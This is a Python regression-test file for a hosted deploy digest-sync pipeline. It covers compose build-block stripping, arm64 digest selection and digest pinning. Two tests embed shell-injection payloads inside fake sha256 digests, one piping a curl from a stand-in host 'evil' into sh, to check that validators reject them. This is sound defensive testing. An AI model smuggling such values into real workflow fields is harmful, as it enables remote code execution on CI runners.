"""AUT-4497: regression tests for the hosted deploy digest-sync path.

Run: python3 tests/test_hosted_deploy.py   (no framework, no deps)
"""
import importlib.util
import json
import os
import pathlib
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

ROOT = pathlib.Path(__file__).resolve().parent.parent


def load(name, rel):
    spec = importlib.util.spec_from_file_location(name, ROOT / rel)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


sync = load("sync", "scripts/sync-compose-to-portainer.py")
resolve = load("resolve", "scripts/resolve-hosted-digests.py")
pins = load("pins", "scripts/update-compose-pins.py")


class TestStripBuildBlocks(unittest.TestCase):
    """EP5 has no build worker; a `build:` key makes Portainer 500 the deploy."""

    COMPOSE = (
        "services:\n"
        "  gh-runner:\n"
        "    # comment stays\n"
        "    build:\n"
        "      context: .\n"
        "      dockerfile: docker/runner/Dockerfile\n"
        "      args:\n"
        "        RUNNER_BASE_IMAGE: base:latest\n"
        "    image: ghcr.io/runner:arm64-latest\n"
        "    restart: unless-stopped\n"
        "  backend:\n"
        "    build:\n"
        "      context: .\n"
        "    image: ghcr.io/backend:hosted\n"
        "    restart: unless-stopped\n"
    )

    def test_removes_build_keys(self):
        out = sync.strip_build_blocks(self.COMPOSE)
        self.assertNotIn("build:", out)
        self.assertNotIn("dockerfile:", out)
        self.assertNotIn("RUNNER_BASE_IMAGE", out)

    def test_keeps_images_and_comments(self):
        out = sync.strip_build_blocks(self.COMPOSE)
        self.assertIn("image: ghcr.io/runner:arm64-latest", out)
        self.assertIn("image: ghcr.io/backend:hosted", out)
        self.assertIn("# comment stays", out)
        self.assertIn("restart: unless-stopped", out)

    def test_result_is_still_valid_yaml_with_same_services(self):
        import yaml
        out = sync.strip_build_blocks(self.COMPOSE)
        doc = yaml.safe_load(out)
        self.assertEqual(set(doc["services"]), {"gh-runner", "backend"})

    def test_hosted_compose_is_unaffected_by_deep_indent(self):
        """Real file: only service-level build: keys may be dropped."""
        import yaml
        src = (ROOT / "docker-compose.hosted.yml").read_text()
        out = sync.strip_build_blocks(src)
        before, after = yaml.safe_load(src), yaml.safe_load(out)
        self.assertEqual(set(before["services"]), set(after["services"]))
        # Only service-level build: keys are dropped; anchors are not touched.
        for svc, spec in after["services"].items():
            if svc in before["services"] and "build" in before["services"][svc]:
                self.assertNotIn("build", spec, f"{svc}.build")
        # Nothing else lost.
        for svc, spec in before["services"].items():
            for k, v in spec.items():
                if k == "build":
                    continue
                self.assertEqual(after["services"][svc].get(k), v, f"{svc}.{k}")


class TestResolveDigests(unittest.TestCase):
    INDEX = {
        "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [
            {"digest": "sha256:" + "a" * 64,
             "platform": {"architecture": "amd64", "os": "linux"}},
            {"digest": "sha256:" + "b" * 64,
             "platform": {"architecture": "unknown", "os": "unknown"}},
            {"digest": "sha256:" + "c" * 64,
             "platform": {"architecture": "arm64", "os": "linux"}},
            {"digest": "sha256:" + "d" * 64,
             "platform": {"architecture": "unknown", "os": "unknown"}},
        ],
    }

    def _run(self, index_by_repo, services=None):
        def fake_run(cmd, **kw):
            img = cmd[4]  # ghcr.io/cannonfodder151/<repo>:<tag>
            repo = img.split("/")[-1].split(":")[0]
            if repo not in index_by_repo:
                raise AssertionError(f"unexpected repo {repo}")
            if isinstance(index_by_repo[repo], Exception):
                return subprocess.CompletedProcess(cmd, 1, "", str(index_by_repo[repo]))
            return subprocess.CompletedProcess(
                cmd, 0, json.dumps(index_by_repo[repo]), "")
        svc_map = resolve.SERVICES if services is None else services
        with mock.patch.object(resolve.subprocess, "run", fake_run), \
             mock.patch.object(resolve, "SERVICES", svc_map), \
             mock.patch.object(sys, "argv", ["resolve-hosted-digests.py", "--tag", "hosted"]):
            with tempfile.TemporaryDirectory() as td:
                out = os.path.join(td, "gh")
                with mock.patch.dict(os.environ, {"GITHUB_OUTPUT": out}):
                    rc = resolve.main()
                body = pathlib.Path(out).read_text() if os.path.exists(out) else ""
            return rc, body

    def test_picks_arm64_linux_not_index_or_amd64(self):
        rc, body = self._run({"autobrain-backend": self.INDEX},
                             services={"backend": "autobrain-backend"})
        self.assertEqual(rc, 0)
        self.assertIn("sha256:" + "c" * 64, body)

    def test_output_keys_have_no_hyphens(self):
        """GitHub expressions cannot property-access a hyphen in an output name."""
        rc, body = self._run({
            "autobrain-backend": self.INDEX,
            "autobrain-dongle-server": self.INDEX,
        }, services={
            "backend": "autobrain-backend",
            "dongle_server": "autobrain-dongle-server",
        })
        self.assertEqual(rc, 0)
        keys = [ln.split("=", 1)[0] for ln in body.splitlines() if ln]
        for k in keys:
            self.assertNotIn("-", k, f"output key {k!r} must be hyphen-free")
        self.assertIn("dongle_server", keys)

    def test_all_or_nothing_on_failure(self):
        """One bad service must not commit a half-synced compose."""
        rc, body = self._run({
            "autobrain-backend": self.INDEX,
            "autobrain-frontend": RuntimeError("boom"),
        })
        self.assertEqual(rc, 1)
        self.assertEqual(body.strip(), "", "must write nothing when any service fails")

    def test_rejects_index_without_arm64(self):
        idx = {"manifests": [{"digest": "sha256:" + "a" * 64,
                              "platform": {"architecture": "amd64", "os": "linux"}}]}
        rc, _ = self._run({"autobrain-backend": idx},
                          services={"backend": "autobrain-backend"})
        self.assertEqual(rc, 1)

    def test_rejects_malformed_digest(self):
        idx = {"manifests": [{"digest": "sha256:short",
                              "platform": {"architecture": "arm64", "os": "linux"}}]}
        rc, _ = self._run({"autobrain-backend": idx},
                          services={"backend": "autobrain-backend"})
        self.assertEqual(rc, 1)

    def test_rejects_shell_injection_in_digest(self):
        """AUT-4745 F1: a 71-char non-hex digest is command injection.

        These digests are spliced unquoted into a `run:` block in
        build-hosted.yml, so a quote + `;` in the value is executed as shell
        on the self-hosted runner. The pre-fix validator was
        `startswith("sha256:") and len == 71`, which this payload passes.
        """
        payload = '"; curl evil|sh; echo "'
        digest = "sha256:" + payload + "a" * (64 - len(payload))
        self.assertEqual(len(digest), 71, "payload must be exactly 71 chars")
        self.assertTrue(digest.startswith("sha256:"))

        idx = {"manifests": [{"digest": digest,
                              "platform": {"architecture": "arm64", "os": "linux"}}]}
        rc, body = self._run({"autobrain-backend": idx},
                             services={"backend": "autobrain-backend"})
        self.assertEqual(rc, 1, "injection digest must be rejected")
        self.assertEqual(body.strip(), "", "must write nothing to GITHUB_OUTPUT")


class TestDigestValidationIsStrict(unittest.TestCase):
    """AUT-4745 F1: both ends of the sync reject non-hex digests."""

    def _pin_rc(self, value):
        with tempfile.TemporaryDirectory() as td:
            f = pathlib.Path(td) / "c.yml"
            f.write_text("services:\n  backend:\n    image: ghcr.io/x@sha256:" + "a" * 64 + "\n")
            argv = sys.argv
            try:
                sys.argv = ["x", "--file", str(f), f"backend={value}"]
                return pins.main()
            finally:
                sys.argv = argv

    def test_pin_script_rejects_injection(self):
        payload = '"; touch /tmp/pwned; echo "'
        value = "sha256:" + payload + "a" * (64 - len(payload))
        self.assertEqual(self._pin_rc(value), 2)

    def test_pin_script_rejects_uppercase_hex(self):
        """Not a real digest encoding; reject rather than write it into compose."""
        self.assertEqual(self._pin_rc("sha256:" + "A" * 64), 2)

    def test_pin_script_rejects_wrong_length(self):
        self.assertEqual(self._pin_rc("sha256:" + "a" * 63), 2)
        self.assertEqual(self._pin_rc("sha256:" + "a" * 65), 2)

    def test_pin_script_accepts_valid_digest(self):
        self.assertEqual(self._pin_rc("sha256:" + "a" * 64), 1)  # 1 = applied, no change

    def test_dead_ai_pin_removed(self):
        """AUT-4745 F5: no autobrain-ai service exists in any compose file."""
        self.assertNotIn("ai", pins.PIN_MAP)


class TestUpdateComposePins(unittest.TestCase):
    def test_covers_all_five_hosted_app_services(self):
        for svc in ("backend", "frontend", "dongle-server", "hub", "backup"):
            self.assertIn(svc, pins.PIN_MAP, f"{svc} missing from PIN_MAP")

    def test_writes_arm64_digest_and_leaves_third_party_bases(self):
        src = (ROOT / "docker-compose.hosted.yml").read_text()
        with tempfile.TemporaryDirectory() as td:
            f = pathlib.Path(td) / "c.yml"
            f.write_text(src)
            new = "sha256:" + "e" * 64
            sys.argv = ["x", "--file", str(f), f"backend={new}"]
            self.assertEqual(pins.main(), 0)
            out = f.read_text()
        self.assertIn("autobrain-backend:hosted@" + new, out)
        # Third-party bases must never be rewritten by a digest sync.
        for base in ("pgvector/pgvector", "redis:7.2.5-alpine", "minio/minio",
                     "decolua/9router"):
            line = next(l for l in out.splitlines() if base in l and "image:" in l)
            self.assertIn("@sha256:", line, f"{base} lost its digest pin")

    def test_returns_1_when_nothing_changed(self):
        src = (ROOT / "docker-compose.hosted.yml").read_text()
        cur = next(l for l in src.splitlines() if "autobrain-backend:hosted@" in l)
        cur_digest = cur.split("@", 1)[1]
        with tempfile.TemporaryDirectory() as td:
            f = pathlib.Path(td) / "c.yml"
            f.write_text(src)
            sys.argv = ["x", "--file", str(f), f"backend={cur_digest}"]
            self.assertEqual(pins.main(), 1)


if __name__ == "__main__":
    unittest.main(verbosity=2)
